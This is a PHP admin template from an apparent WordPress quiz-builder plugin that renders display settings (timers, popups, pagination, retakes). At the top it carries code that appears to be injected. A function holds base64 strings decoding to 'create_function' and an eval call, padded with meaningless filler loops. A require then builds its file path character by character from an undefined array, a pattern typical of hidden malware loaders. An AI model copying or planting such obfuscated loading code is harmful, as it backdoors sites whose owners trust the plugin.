<?php

if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
?>

<!-- timer html start ---> 
	<?php 
	$st_background_color = "#6594ad";
	$st_background_color_second = "#6bb2af";
	$st_spread_radius = "15";
	$st_blur_radius = "15";
	$st_horizontal_length = "1";
	$st_vertical_length = "1";
	$st_shadow_background_color = "#d6caca";
	$quiz_timer_html = '<div class="sqb_tiny_mce_editor " ><div ><span style="font-size: 13pt;" ><strong>Time Left: %%TIMELEFT%%</strong></span></div></div>'; 

	$quiz_display_heading_html = '<div class="sqb_tiny_mce_editor " ><div ><span style="font-size: 13pt;" ><strong>Display Heading</strong></span></div></div>'; 

	$quiz_display_totaltime_html = '<div class="sqb_tiny_mce_editor " ><div ><div style="text-align: center;"><span style="font-size: 13pt;"><strong>Total Time</strong></span></div>
<div style="text-align: center;"><span style="font-size: 13pt;"><strong> [SQBTimeSpent]</strong></span></div></div></div>'; 
	

	$quiz_timer_spent_html = '<div class="sqb_tiny_mce_editor " ><div>	<span style="font-size: 13pt;" ><strong>Time Spent: %%TIMESPENT%%</strong></span></div></div>'; 
	$quiz_timer_expired_msg = '<div class="sqb_tiny_mce_editor "><div>Time expired. Sorry, you will not be able to continue with this quiz. Please opt-in to see the result.</div></div>';
	$timer_enable = 'N'; 
	$quiz_timer_hours = 00;
	$quiz_timer_mint = 00;
	$quiz_timer_sec = 00;
	$quiz_timer_elapses = 'show_last_screen';
	$quiz_timer_display_in_screen = 'question';
	$timer_edit_class = '';
	$speed_timer_edit_class = '';
	$timer_btn_text = 'Click to Configure Timer Settings';
	$timer_text_hour_html = '<div class="sqb_tiny_mce_editor "><div>HRS</div></div>';
	$timer_text_mint_html = '<div class="sqb_tiny_mce_editor "><div>MIN</div></div>';
	$timer_text_sec_html = '<div class="sqb_tiny_mce_editor "><div>SEC</div></div>';

	$speed_timer_text_hour_html = '<div class="sqb_tiny_mce_editor "><div>HRS</div></div>';
	$speed_timer_text_mint_html = '<div class="sqb_tiny_mce_editor "><div>MIN</div></div>';
	$speed_timer_text_sec_html = '<div class="sqb_tiny_mce_editor "><div>SEC</div></div>';
	
	
	$speed_timer_enable = "N";
	
	if(isset($quiz_data)){
		$timer_edit_class = ' timer_cutomizer_show_option_cutomize';
		$speed_timer_edit_class = ' speed_timer_cutomizer_show_option_cutomize';
		
		$timer_customizer = $quiz_data->getTimerCustomizer();
		if($timer_customizer != ''){
			$timer_btn_text = 'Edit Timer Settings';
			$timer_customizer_array = explode('||',$timer_customizer);
			
			
			if(isset($timer_customizer_array[0])){
				$timer_enable = $timer_customizer_array[0];
			}
			
			if(isset($timer_customizer_array[1])){
				$quiz_timer_hours = $timer_customizer_array[1];
			}
			if(isset($timer_customizer_array[2])){
				$quiz_timer_mint = $timer_customizer_array[2];
			}
			
			if(isset($timer_customizer_array[3])){
				$quiz_timer_sec = $timer_customizer_array[3];
			}
			
			
			
			if(isset($timer_customizer_array[4])){
				$quiz_timer_elapses = $timer_customizer_array[4];
			}
			
			if(isset($timer_customizer_array[5])){
				$quiz_timer_display_in_screen = $timer_customizer_array[5];
			}
			
			$quiz_timer_html_data = $quiz_data->getTimerHtml();
			$quiz_timer_html_data_array = explode('||||',$quiz_timer_html_data);
			if(isset($quiz_timer_html_data_array[0])){
				$quiz_timer_html = $quiz_timer_html_data_array[0];
			}
			if(isset($quiz_timer_html_data_array[1])){
				$quiz_timer_spent_html = $quiz_timer_html_data_array[1];
			}
			
			if(isset($quiz_timer_html_data_array[2])){
				$timer_text_hour_html = $quiz_timer_html_data_array[2];
			}
			if(isset($quiz_timer_html_data_array[3])){
				$timer_text_mint_html = $quiz_timer_html_data_array[3];
			}
			if(isset($quiz_timer_html_data_array[4])){
				$timer_text_sec_html = $quiz_timer_html_data_array[4];
			}
			
			$quiz_timer_expired_msg = $quiz_data->getTimerExpiredMsg();
		}
		
		$speed_timer_customizer = $quiz_data->getAllOtherOptions();
		if($speed_timer_customizer && $speed_timer_customizer != 'NULL'){
			$speed_timer_customizer = maybe_unserialize($speed_timer_customizer);
			if(!empty($speed_timer_customizer)){

				if(array_key_exists('speed_timer_enable', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['speed_timer_enable'])){
						$speed_timer_enable = $speed_timer_customizer['speed_timer_enable'];
	   				}	
				}
				
				if(array_key_exists('quiz_display_heading_html', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['quiz_display_heading_html'])){
						$quiz_display_heading_html = $speed_timer_customizer['quiz_display_heading_html'];
	   				}	
				}
				if(array_key_exists('quiz_display_totaltime_html', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['quiz_display_totaltime_html'])){
						$quiz_display_totaltime_html = $speed_timer_customizer['quiz_display_totaltime_html'];
	   				}	
				}

				if(array_key_exists('speed_timer_text_hour_html', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['speed_timer_text_hour_html'])){
						$speed_timer_text_hour_html = $speed_timer_customizer['speed_timer_text_hour_html'];
	   				}	
				}
				if(array_key_exists('speed_timer_text_mint_html', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['speed_timer_text_mint_html'])){
						$speed_timer_text_mint_html = $speed_timer_customizer['speed_timer_text_mint_html'];
	   				}	
				}
				if(array_key_exists('speed_timer_text_sec_html', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['speed_timer_text_sec_html'])){
						$speed_timer_text_sec_html = $speed_timer_customizer['speed_timer_text_sec_html'];
	   				}	
				}


				if(array_key_exists('st_background_color', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['st_background_color'])){
						$st_background_color = $speed_timer_customizer['st_background_color'];
	   				}	
				}
				if(array_key_exists('st_background_color_second', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['st_background_color_second'])){
						$st_background_color_second = $speed_timer_customizer['st_background_color_second'];
	   				}	
				}
				if(array_key_exists('st_shadow_background_color', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['st_shadow_background_color'])){
						$st_shadow_background_color = $speed_timer_customizer['st_shadow_background_color'];
	   				}	
				}
				if(array_key_exists('st_spread_radius', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['st_spread_radius'])){
						$st_spread_radius = $speed_timer_customizer['st_spread_radius'];
	   				}	
				}
				if(array_key_exists('st_blur_radius', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['st_blur_radius'])){
						$st_blur_radius = $speed_timer_customizer['st_blur_radius'];
	   				}	
				}
				if(array_key_exists('st_horizontal_length', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['st_horizontal_length'])){
						$st_horizontal_length = $speed_timer_customizer['st_horizontal_length'];
	   				}	
				}
				if(array_key_exists('st_vertical_length', $speed_timer_customizer)){
					if(!empty($speed_timer_customizer['st_vertical_length'])){
						$st_vertical_length = $speed_timer_customizer['st_vertical_length'];
	   				}	
				}
			}
		}
	}
		
	?>





<style type="text/css">
	:root{
		--st-background-color: <?php echo $st_background_color; ?>;
		--st-background-color-second: <?php echo $st_background_color_second; ?>;
		--st-shadow-background-color: <?php echo $st_shadow_background_color; ?>;
		--st-spread-radius: <?php echo $st_spread_radius; ?>px;
		--st-blur-radius: <?php echo $st_blur_radius; ?>px;
		--st-horizontal-length: <?php echo $st_horizontal_length; ?>px;
		--st-vertical-length: <?php echo $st_vertical_length; ?>px;
			
	}
</style>

<div class="sqb-inner-tab-heading-v2">
    <h2>Display Settings</h2>
    <p>You can enable or disable various quiz features to tailor the user experience.</p>
</div>

<h5 class="quiz--sub-title">Quiz Display</h5>  
	<div class="quiz-card-outer-gray">									
	 <div class="quiz-content-card">
		<label for="" class="quiz_label">Show quiz in a popup or in-page? </label>
		<div class="quiz_right-content">
			<label class="radio-btn--outer"><input type="radio" name="quiz_display" value="inpage" <?php echo $quiz_display_inpage_checked;?>>In-page </label>
			<label class="radio-btn--outer"><input type="radio" name="quiz_display" value="popup" <?php echo $quiz_display_popup_checked;?>>Popup</label>
			
			<div class="popup-options" style="<?php echo $quiz_display_popup_options; ?>">
				<label class="radio-btn--outer radio-exit">
					<input type="radio" name="defaultpopup_type" value="exit" <?php echo $quiz_display_exit_checked; ?>><strong>Exit Popup <div class="tool-tip popup-tooltip"> <i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc "> This quiz will be displayed when users leave the selected pages below </div> </div></strong>
				</label>
				<label class="radio-btn--outer">
					<input class="radio-button-click" type="radio" name="defaultpopup_type" value="popup" <?php echo $quiz_display_buttonclick_checked; ?>><strong>Button Click</strong>
				</label>

				<label class="radio-btn--outer">
					<input type="radio" class="time-based-popup" name="defaultpopup_type" value="time_based" <?php echo $quiz_display_time_based_checked; ?>><strong>Time on page in seconds <div class="tool-tip popup-tooltip"> <i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc "> Popup will be displayed after the specified time. </div> 
						</div> <span style="color:#121210cc;">(time-based popup)</span> </strong>
					<div class="time-based-outer" style="<?php if($quiz_display_time_based_checked == ' checked'){ echo 'display:block;';}else{ echo 'display:none;';} ?>">
						<input type="number" name="time_based_input" class="time-based-input" value="<?php echo $quiz_display_time_based_value; ?>"> 
					</div>
					<div class="popup-error-msg-time" style="display: none; color: #e81111; line-height: normal; margin: 0;padding: 5px 0 0 20px;">Please add time in seconds</div> </label>

				<label class="radio-btn--outer">
					<input type="radio" name="defaultpopup_type" value="percentage_based" <?php echo $quiz_display_percentage_based_checked; ?>><strong>Percentage of page scrolled <span style="color:#121210cc;">(scroll-based popup) </span>
						</strong>
					<div class="percentage-based-outer" style="<?php if($quiz_display_percentage_based_checked == ' checked'){ echo 'display:block;';}else{ echo 'display:none;';} ?>">
						<input type="number" name="percentage_based_input" class="percenatge-based-input" value="<?php echo $quiz_display_percentage_based_value; ?>"><span>%</span>
					</div>
					<div class="popup-error-msg-percentage" style="display: none; color: #e81111; line-height: normal; margin: 0;padding: 5px 0 0 20px;">Please add a percent for the "scroll-based" popup setting</div>
				</label>

				<label class="radio-btn--outer">
					<input type="radio" name="defaultpopup_type" value="corner_popup" <?php echo $quiz_display_corner_popup_checked; ?>><strong>Corner Popup <div class="tool-tip popup-tooltip"> <i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc "> This quiz will popup in the bottom right corner of the screen </div> </div></strong>
				</label>
			</div>
		</div>
	</div>
	<div class="quiz-content-card show-form-quiz-option" style="display: none;">
		<label for="" class="quiz_label">When should the form be displayed? </label>
		<div class="quiz_right-content">
			<label class="radio-btn--outer">
				<input type="radio" name="popup_type" value="popup" <?php echo $form_display_default_checked; ?>><strong>Button Click</strong> <span style="color:#121210cc;">(Display opt-in form in a popup when users click on a "get instant access" button)</span></label>
			<label class="radio-btn--outer">
				<input type="radio" name="popup_type" value="entry" <?php echo $form_display_entry_checked; ?>><strong>Entry Popup</strong> <span style="color:#121210cc;">(Display form as a popup when users visit selected pages)</span></label>
			<label class="radio-btn--outer">
				<input type="radio" name="popup_type" value="exit" <?php echo $form_display_exit_checked; ?>><strong>Exit Popup</strong> <span style="color:#121210cc;">(Display form as a popup when users leave selected pages)</span></label>
			<label class="radio-btn--outer">
				<input type="radio" name="popup_type" value="time_based" <?php echo $quiz_display_time_based_checked; ?>><strong>Time on page in seconds  <span style="color:#121210cc;">(time-based popup)</span> </strong>
				<div class="form-time-based-outer" style="<?php if($quiz_display_time_based_checked === ' checked'){ echo 'display:block;';}else{ echo 'display:none;';} ?>">
					<input type="number" name="form_time_based_input" class="form-time-based-input" value="<?php echo $quiz_display_time_based_value; ?>"> <div class="tool-tip popup-tooltip"> <i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc "> Popup will be displayed after the specified time. </div> 
					</div>
				</div>
				<div class="popup-error-msg-time" style="display: none; color: #e81111; line-height: normal; margin: 0;padding: 5px 0 0 20px;">Please add time in seconds</div>
			</label>
			<label class="radio-btn--outer">
				<input type="radio" name="popup_type" value="percentage_based" <?php echo $quiz_display_percentage_based_checked; ?>><strong>Percentage of page scrolled <span style="color:#121210cc;">(scroll-based popup) </span>
					</strong>
				<div class="form-percentage-based-outer" style="<?php if($quiz_display_percentage_based_checked == ' checked'){ echo 'display:block;';}else{ echo 'display:none;';} ?>">
					<input type="number" name="form_percentage_based_input" class="form-percenatge-based-input" value="<?php echo $quiz_display_percentage_based_value; ?>"><span>%</span>
				</div>
				<div class="popup-error-msg-percentage" style="display: none; color: #e81111; line-height: normal; margin: 0;padding: 5px 0 0 20px;">Please add a percent for the "scroll-based" popup setting</div>
			</label>
		</div>
	</div>
	<div class="create_quiz_advance_options1 sqb_multiple_url_select_time" style="<?php echo $sqb_multiple_url_select_time; ?>">
		<div class="quiz-card-outer-gray">							
			<div class="quiz_select_url_outer">
		   		<div class="quiz-content-card time-delay" style="<?php echo $time_delay; ?>">
					<label for="" class="quiz_label">Time Delay:
					<div class="tool-tip">
					<i class="fa fa-info-circle" aria-hidden="true"></i>
					<div class="toll-tip-desc">The popup will only show up after the time delay.</div>
					</div>
					</label>
					<div class="quiz_right-content">
						<input type="number" name="sqb_cp_time_delay" id="sqb_cp_time_delay" value="<?php if(isset($sqb_cp_time_delay)) { echo $sqb_cp_time_delay; } else { echo 0; } ?>" min="0" style="max-width: 110px;"> <label style="margin: 0 0 0 4px;">Seconds</label>
					</div>
				</div>
				<div class="time-delay-outer">
					<div class="quiz-content-card time-delay-inner" style="border-bottom: none;">
						<label for="" class="quiz_label">How often should the popup be displayed:
						</label>
						<div class="quiz_right-content radio-btn-list">
							<label class="radio-btn--outer">
								<input type="radio" name="sqb_cp_display_frequency" value="always" min="0" <?php if($sqb_cp_set_display_frequency_key == 'always' || $sqb_cp_set_display_frequency_key == ''){ echo "checked"; } ?>>Always
							</label>
							<label class="radio-btn--outer">
								<input type="radio" name="sqb_cp_display_frequency" value="display_once" min="0" <?php if($sqb_cp_set_display_frequency_key =='display_once'){ echo "checked"; } ?>>Display Once
							</label>
							<label class="radio-btn--outer">
								<input type="radio" name="sqb_cp_display_frequency" value="set_display_frequency" min="0" <?php if($sqb_cp_set_display_frequency_key =='set_display_frequency'){ echo "checked"; } ?>>Set a Display Frequency
							</label>
						</div>
					</div>
					
					<div class="quiz-content-card time-delay-inner" <?php if($sqb_cp_set_display_frequency_key != 'set_display_frequency'){ ?>style="display:none;" <?php } ?>>
						<!-- <label for="" class="quiz_label">Set Popup Frequency:</label> -->
						<div class="quiz_right-content popup-frequency">
							Enter popup frequency <input type="number" name="sqb_cp_set_display_frequency" id="sqb_cp_set_display_frequency" value="<?php echo $sqb_cp_set_display_frequency; ?>" min="1" style="max-width: 110px;"> in days
						</div>
					</div>
				</div>

			</div> <!-- closed class -->
		</div>
	</div>
	<div class="create_quiz_advance_options1 sqb_multiple_url_select" style="<?php echo $sqb_multiple_url_select; ?>">
		<div class="quiz-card-outer-gray">							
			<div class="quiz_select_url_outer">
		   		<div class="quiz-content-card">
					
			   		<div class="row">
			   			<div class="col-sm-12 mb-2">
			   				<label class="quiz--sub-title">Select Pages/Posts where this popup will be Displayed</label>
			   				<p>If you want to add shortcode manually on your pages,<br>
								you don't have to select pages here.</p>
			   			</div>
			   			<div class="col-sm-6">
							<div class="quiz_select_url">
								<input type="text" name="sqb_search_multiple_select" id="sqb_search_multiple_select" value="" style="max-width: 100%;" placeholder="Search URL">														
								<ul class="sqb_select_urls sqb_pages_posts_list">
								
								</ul>
							</div>
						</div>

						<div class="col-sm-6">
							<div class="quiz_selected_url">
								<h4>Selected Pages/Posts.</h4>
								<ul class="sqb_selected_urls">
								</ul>
							</div>
							<div class="quiz-settings-redirect">
								<label class="quiz_label"><a href="../wp-admin/admin.php?page=sqb_settings&tab=global_settings" target="_blank">Click</a> to Configure Mobile Timer</label>
							</div>
						</div>
					</div>
				</div>
			</div> 
		</div>
	</div>
	<div class="quiz-content-card sqb_popup_position_outer" style="<?php echo $hide_position; ?>">
		<label for="" class="quiz_label">Popup Position</label>
			<div class="quiz_right-content">
				<select name="sqb_popup_position" id="sqb_popup_position">
					<option value="Right" <?php if($quiz_popup_position == 'Right'){ echo 'selected'; } ?>>Right</option>
					<option value="Left" <?php if($quiz_popup_position == 'Left'){ echo 'selected'; } ?>>Left</option>
				</select>
			</div>
	</div>
	<div class="quiz-content-card " style="display:none !important;">
		<label for="" class="quiz_label">How many questions to display</label>
		<div class="quiz_right-content">
			<label class="radio-btn--outer"><input type="radio" name="question_display" value="all"  <?php echo $question_display_all_checked;?>>All on the same page</label>
			<label class="radio-btn--outer"><input type="radio" name="question_display" value="limited"  <?php echo $question_display_limited_checked;?>>Display limited questions</label>
		</div>
	</div>
	
	<div class="quiz-content-card number_of_question_div" style="display:none !important;<?php //if(isset($quiz_data)){ if($quiz_data->getQuestionDisplay() == "limited"){ echo "inline-block";}else{ echo "none";}}else { echo "none";} ?>">
		<label for="" class="quiz_label">Total number of questions to be displayed</label>
		<div class="quiz_right-content">
				<input type="text" name="number_of_question" id="number_of_question" value="<?= isset($quiz_data) ? $quiz_data->getNumberOfQuestion() : '9999' ?>">
		</div>
	</div>


	

	<div class="quiz-content-card" style="display:none !important;">
		<label for="" class="quiz_label">Show correct answer?</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="show_correct_ans" type="checkbox" id="show_correct_ans" value="N" <?php if(isset($quiz_data) && ($quiz_data->getQuizShowCorrectAnswer() == 'Y')){ echo "checked='checked'";} ?>>
				<label for="show_correct_ans"></label>
			</div>
		</div>
	</div>
	

	<div class="quiz-content-card quiz_pagination_outer" style="<?php if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll")){echo 'display:none';}?>">
		<h5 class="quiz--sub-title">Pagination Options</h5>
		<div class="quiz_right-content">
			<label class="radio-btn--outer"><input type="radio" name="quiz_pagination" value="one_per_page" <?php echo $quiz_pagination_checked;?>>One question per page</label>
			<label class="radio-btn--outer"><input type="radio" name="quiz_pagination" value="all" <?php echo $quiz_pagination_checked1;?>> All questions on the same page</label>
			
			<div class="all_question_same_page category-question-sub-field" style="<?php if($quiz_pagination_checked1 == " checked"){ echo ''; }else{ echo 'display:none'; } ?>">
				<div class="fixed-number-qns">
					<!-- <label class="mr-2"> Show next button after each question. Don't allow users to answer the next question until they click the next button.</label> -->
					<label class="radio-btn--outer"><input type="radio" name="question_same_page" value="no_next_button" <?php echo ($same_page_option == "no_next_button")?'checked':''; ?>> No Next Button<div class="tool-tip" style="margin-left:10px;"><i class="fa fa-info-circle" aria-hidden="true"></i>	<div class="toll-tip-desc pdf-report-tooltip" style="max-width: 500px;">Allow users to answer questions in any order. </div></div></label>
					<label class="radio-btn--outer"><input type="radio" name="question_same_page" value="next_btn" <?php echo ($same_page_option == "next_btn")?'checked':''; ?>> Next Button<div class="tool-tip" style="margin-left:10px;"><i class="fa fa-info-circle" aria-hidden="true"></i>	<div class="toll-tip-desc pdf-report-tooltip" style="max-width: 500px;">Users need to answer questions in a specific order and click the next button to continue.</div></div></label>

					
					<label class="radio-btn--outer category-name-link" style="<?php if(isset($quiz_data) && ($quiz_type == "scoring" || $quiz_type == "assessment") && $quiz_data->getCategory() == 'Y'){ echo 'display:block'; }else{ echo 'display:none'; } ?>">

						<input type="radio" name="question_same_page" value="category_names" <?php echo ($same_page_option == "category_names")?'checked':''; ?>> Group by Category<div class="tool-tip" style="margin-left:10px;"><i class="fa fa-info-circle" aria-hidden="true"></i>	<div class="toll-tip-desc pdf-report-tooltip" style="max-width: 500px;">Questions from the same category will be grouped together.</div></div>
						<div class="category-options-for-question-pagination-all" style="<?php if(isset($quiz_data) && ($quiz_type == "scoring" || $quiz_type == "assessment") && $same_page_option == "category_names"){echo 'display:block';}else{ echo 'display:none;'; } ?>">
							<?php $quizCategorydata = SQB_QuizCategory::load(); ?>
							<div class="no-categories-found" style="<?php if($quizCategorydata == ""){ echo ''; }else{ echo 'display:none'; } ?>">
								<p><strong>No categories found. To use this option, you need to first create the categories.</strong></p>
								<div><strong><a href="../wp-admin/admin.php?page=sqb_settings&tab=create_category" target="_blank">Click here</a> to create categories</strong></div>
							</div>

							<div class="category-links">
								<label>Show Category Links<div class="tool-tip" style="margin-left:10px;"><i class="fa fa-info-circle" aria-hidden="true"></i>	<div class="toll-tip-desc pdf-report-tooltip" style="max-width: 500px;">Display clickable category links at the top for easy navigation.</div></div></label>
								<div class="quiz_right-content">
									<div class="square-switch_onoff">
										<input class="checkbox" name="show_category_link" type="checkbox" id="show_category_link" value="" <?php if($show_category_link == 'Y'){ echo 'checked'; } ?>>
										<label for="show_category_link"></label>
									</div>
								</div>
							</div>
							<div class="category-links-color" style="<?php if($show_category_link == 'N'){ echo 'display: none;'; } ?>">
								<div id="show_category_link_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
									<label class="mr-2">Category Text: </label>
									<input type="text" value="<?php echo $show_category_link_color; ?>" id="show_category_link_color" class="colorpicker-element">
									<span class="input-group-addon"><i style="<?php echo $show_category_link_color; ?>"></i></span>
								</div>
							</div>

							<div class="all-update-category-order" style="<?php if($quizCategorydata == ""){ echo 'display:none'; }else{ echo ''; } ?>">
								<strong><a href="javascript:void(0)" class="update-category-order-btn">Update Category Display Order</a></strong>
								<br>
							</div>
							
						</div>
					</label>						
				</div>
			</div>

			<label class="radio-btn--outer"><input type="radio" name="quiz_pagination" value="fixed_number" <?php echo $quiz_pagination_checked3;?>> Fixed number of questions per page (pagination)</label>
			
			<div class="question-pagination-option category-question-sub-field" style="<?php if($quiz_pagination_checked3 == " checked"){ echo ''; }else{ echo 'display:none'; } ?>">
				<div class="fixed-number-qns">
					<p><label class="mr-2"> Enter Number Here</label>
						<input type="number" name="question_pagination_count" id="question_pagination_count" value="<?php echo $question_pagination_count; ?>"></p>
				</div>
			</div>
			<label class="radio-btn--outer question-category-options-label" style="<?php if(isset($quiz_data) && ($quiz_type == "scoring" || $quiz_type == "assessment")){ echo 'display:block'; }else{ echo 'display:none'; } ?>"><input type="radio" name="quiz_pagination" value="question_on_category" <?php echo $quiz_pagination_checked4;?>> Show all questions from a category on the same page (pagination)</label>
			

			<div class="category-options-for-question-pagination category-question-sub-field" style="<?php if(isset($quiz_data) && ($quiz_type == "scoring" || $quiz_type == "assessment") && $quiz_pagination_checked4 == " checked"){echo 'display:block';}else{ echo 'display:none;'; } ?>">
				<?php $quizCategorydata = SQB_QuizCategory::load(); ?>
				<div class="no-categories-found" style="<?php if($quizCategorydata == ""){ echo ''; }else{ echo 'display:none'; } ?>">
					<p><strong>No categories found. To use this option, you need to first create the categories.</strong></p>
					<div><strong><a href="../wp-admin/admin.php?page=sqb_settings&tab=create_category" target="_blank">Click here</a> to create categories</strong></div>
				</div>
				<div class="update-category-order" style="<?php if($quizCategorydata == ""){ echo 'display:none'; }else{ echo ''; } ?>">
					<strong><a href="javascript:void(0)" class="update-category-order-btn">Click here</a> to update category order</strong>
					<br>
				</div>
			</div>
		</div>
	</div>
	
	<div class="quiz-content-card question_per_page_outer" style="display:none!important;<?php //if(isset($quiz_data)){ if($quiz_data->getQuestionPerPage() == "limited"){ echo "inline-block";}else{ echo "none";}}else { echo "none";} ?>">
		<label for="" class="quiz_label">Enter total number of questions per page</label>
		<div class="quiz_right-content">
			<input type="number" name="question_per_page" id="question_per_page" value="<?= isset($quiz_data) ? $quiz_data->getQuestionPerPage() : '1' ?>">
		</div>
	</div>
	
	
	<div class="quiz-content-card question_all_on_same_page_div" style="display:none !important;<?php //if(isset($quiz_data)){ if($quiz_data->getQuestionPerPage() == "all"){ echo "inline-block";}else{ echo "none";}}else { echo "none";} ?>">
		<label for="" class="quiz_label">Select results display</label>
		<div class="quiz_right-content start_template_outer">
				<select name="result_display_option" id="result_display">
					<option value="different_page" <?php echo $result_display_option_selected;?>>Results on a different page</option>													 
					<option value="question_ans_page" <?php echo $result_display_option_selected1;?>>Results on the question / answer page</option>									 
				</select>
				 
		</div>
	</div>
	
	<div class="quiz-content-card show_progress_bar_section" style="<?php if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll")){echo 'display:none';}?>">
		<h5 class="quiz--sub-title">Show Progress Bar?</h5>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="progress_bar" type="checkbox" id="progress_bar" value="Y"  <?php if(isset($quiz_data) && ($quiz_data->getProgressBar() == 'N')){ }else{ echo "checked='checked'";}?>>
				<label for="progress_bar"></label>
			</div>
		</div>
	</div>
	
	<div class="quiz-content-card quiz_slider_animation_div_display" style="<?php echo $quiz_slider_animation_div_display;?>"  >
		<h5 class="quiz--sub-title">Slide-in Animation</h5>		
		<label for="" class="quiz_label">Do you want to use slide-in animation effect between screens?</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="quiz_slider_animation" type="checkbox" id="quiz_slider_animation" value="Y" <?php  if($quiz_slider_animation == "checked") { echo " checked"; } else{ echo "";}?>>
				<label for="quiz_slider_animation"></label> 
			</div>
		</div>	
		
		<div class="quiz_right-content radio-slide-option <?php  if($quiz_slider_animation == "checked") { echo " show-slide-option"; } else{ echo "";}?>">
			
			<label for="right-left" class="radio-btn--outer">
				<input type="radio" id="right-left" name="quiz_slider_animation_option" value="rl" <?php if($quiz_slider_animation_options == 'rl'){ echo 'checked="checked"'; }else{ echo ""; } ?>>Right To Left
			</label>
			
			<label for="top-bottom" class="radio-btn--outer">
				<input type="radio" id="top-bottom" name="quiz_slider_animation_option" value="tb" <?php if($quiz_slider_animation_options == 'tb'){ echo 'checked="checked"'; }else{ echo ""; } ?>>Top To Bottom
			</label>		
		</div>
	</div> 
	
	<div class="quiz-content-card border-bottom-0 pb-0 sqb-hide-for-form-poll" style="<?php if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll")){echo 'display:none';} ?>">
		<h5 class="quiz--sub-title">Prevent Re-submission</h5>	
		<label for="" class="quiz_label">Users can submit the quiz ONLY once</label>
		<label for="" class="quiz_label mb-3" style="font-size:12px; color: gray;"><strong>Prevent users from submitting the quiz more than once even if they refresh the page</strong></label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="prevent-resubmission" type="checkbox" id="prevent-resubmission" value="" <?php if($prevent_resubmission == 'Y'){ echo "checked"; } else { echo ""; } ?>>
				<label for="prevent-resubmission"></label>
			</div>
		</div>
		<div class="block-quiz-outer prevent-resubmission-inner" style="<?php if($prevent_resubmission == 'Y'){ echo "display:block;"; } else { echo "display:none;"; } ?>">
			
			<div class="quiz_right-content radio-btn-list">
				<label class="radio-btn--outer">
					<input type="radio" name="sqb_block_quiz" value="browser" <?php if($sqb_block_quiz == 'browser' || $sqb_block_quiz == ''){ echo "checked"; } ?>>Block based on browser 
				</label>
				<label class="radio-btn--outer">
					<input type="radio" name="sqb_block_quiz" value="browser_ip" <?php if($sqb_block_quiz =='browser_ip'){ echo "checked"; } ?>> Block based on browser and IP  
				</label>
				
			</div>
			
			<a class="btn sqb_transprent_btn sqb_block_customize_message mt-3" href="javascript:void(0)">Customize Message</a>

		</div>
	</div>



	<div class="quiz-content-card allow_retake_quiz_outer border-bottom-0 pb-0" style="<?php if(isset($quiz_data) && ($quiz_type == "form" || $quiz_type == "poll")  || $prevent_resubmission == "Y"){echo 'display:none';}?>">
		<h5 class="quiz--sub-title">Retake Quiz</h5>	
		<label for="" class="quiz_label">Do you want to allow users to retake the quiz?</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="allow_retake_quiz" type="checkbox" id="allow_retake_quiz" value="" <?php if($allow_retake_checked == 'checked'){ echo "checked"; } else { echo ""; } ?>>
				<label for="allow_retake_quiz"></label>
			</div>
		</div>
	</div>
	
	<div class="quiz-content-card sqb_retak_option_outer border-bottom-0 pb-0" style="<?php echo $sqb_attempts_allowed_display_style; ?>">
		<label for="" class="quiz_label">How many retake attempts are allowed</label>
